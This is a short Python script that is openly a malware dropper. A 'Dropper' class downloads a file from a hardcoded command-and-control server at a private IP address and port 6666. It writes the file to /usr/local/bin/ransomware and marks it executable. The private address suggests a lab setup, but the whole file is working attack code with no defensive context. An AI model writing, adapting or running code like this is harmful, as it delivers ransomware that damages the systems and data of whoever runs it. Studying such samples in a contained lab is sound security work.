import requests
import os

class Dropper():
    CNC_ADDRESS="http://172.19.0.2:6666/"

    def get_malware(self):
        ''' Download the malware from the CNC '''
        url = Dropper.CNC_ADDRESS + "malware"
        resp = requests.get(url)
        malware = resp.content

        path = "/usr/local/bin/ransomware"
        with open(path, "wb") as f:
            f.write(malware)

        os.chmod(path, 755)



if __name__=="__main__":
    dropper = Dropper()
    dropper.get_malware()
